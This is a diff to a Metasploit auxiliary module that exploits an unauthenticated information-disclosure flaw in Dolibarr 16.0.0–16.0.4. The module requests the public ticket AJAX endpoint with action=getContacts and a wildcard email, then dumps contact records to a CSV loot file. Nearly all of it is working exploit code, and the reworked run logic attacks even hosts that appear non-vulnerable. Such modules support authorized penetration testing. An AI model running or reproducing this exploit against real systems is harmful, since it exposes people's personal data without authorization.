@@ -47,41 +47,38 @@ class MetasploitModule < Msf::Auxiliary
     )
   end
 
-  def check_host(_ip)
+  def check
     res = send_request_cgi!({
       'method' => 'GET',
       'uri' => normalize_uri(target_uri.path)
     })
-    return Exploit::CheckCode::Unknown unless res && res.code == 200
-
-    vprint_line('--Check Host--')
-    vprint_good("Domain: #{vhost}")
-    vprint_good("Target_URI: #{target_uri}")
-    vprint_good("Response Code: #{res.code}")
-    vprint_good("Response Body: #{res.body}")
+    return Exploit::CheckCode::Unknown('Connection failed') unless res
+    return Exploit::CheckCode::Safe unless res.code == 200
 
     /Dolibarr (?<version>\d+.*\.\d+)/ =~ res.body
     version = Rex::Version.new(version)
-    if version.between?(Rex::Version.new('16.0.0'), Rex::Version.new('16.0.4'))
-      return [Exploit::CheckCode::Appears, version]
-    elsif version == '0'
-      version = 'not found'
-      return [Exploit::CheckCode::Detected, version]
-    end
 
-    return [Exploit::CheckCode::Safe, version]
+    if version.between?(Rex::Version.new('16.0.0'), Rex::Version.new('16.0.4'))
+      print_good("Detected vulnerable Dolibarr version: #{version}")
+      return Exploit::CheckCode::Appears
+    elsif version == '0'
+      print_warning('Dolibarr version not found - proceeding anyway...')
+      return Exploit::CheckCode::Detected
+    else
+      print_warning("Detected apparently non-vulnerable Dolibarr version: #{version} - proceeding anyway...")
+      return Exploit::CheckCode::Detected
+    end
   end
 
-  def exploit
+  def exploit(ip)
     res = send_request_cgi!({
       'method' => 'GET',
-      'uri' => normalize_uri(target_uri.path, 'public', 'ticket', 'ajax', 'ajax.php?action=getContacts&email=%')
+      'uri' => normalize_uri(target_uri.path, '/public/ticket/ajax/ajax.php'),
+      'vars_get' => {
+        'action' => 'getContacts',
+        'email' => '%'
+      }
     }, 90, true)
-    vprint_line('--Exploit request--')
-    vprint_line("Domain: #{vhost}")
-    vprint_line("Target_URI: #{normalize_uri(target_uri.path, 'public', 'ticket', 'ajax', 'ajax.php?action=getContacts&email=%')}")
-
-    vprint_line('--Exploit response--')
 
     res_json_document = res.get_json_document['contacts']
 
@@ -90,9 +87,6 @@ class MetasploitModule < Msf::Auxiliary
     elsif res_json_document.nil?
       fail_with(Failure::UnexpectedReply, 'Dolibarr database empty')
     end
-
-    vprint_good("Response Code: #{res.code}")
-    vprint_good("Response Body: #{res.body}")
 
     begin
       print_good("Database type: #{res_json_document[0]['db']['type']}")
@@ -129,7 +123,7 @@ class MetasploitModule < Msf::Auxiliary
     path = store_loot(
       'dolibarr',
       'application/CSV',
-      vhost,
+      ip,
       csv_string,
       '.csv'
     )
@@ -137,15 +131,12 @@ class MetasploitModule < Msf::Auxiliary
     print_good("#{rhost}:#{rport} - File saved in: #{path}")
   end
 
-  def run_host(_ip)
-    check_code, version = check
-    if check_code == Exploit::CheckCode::Safe || check_code == Exploit::CheckCode::Detected
-      print_bad("Detected apparently non-vulnerable Dolibarr version: #{version}")
-      vprint_status('Proceeding to exploit anyway')
-      exploit
-    elsif check_code == Exploit::CheckCode::Appears
-      print_good("Detected vulnerable Dolibarr version: #{version}")
-      exploit
+  def run_host(ip)
+    check_code = check
+    if check_code == Exploit::CheckCode::Appears || check_code == Exploit::CheckCode::Detected
+      exploit(ip)
     end
   end
+
 end
+
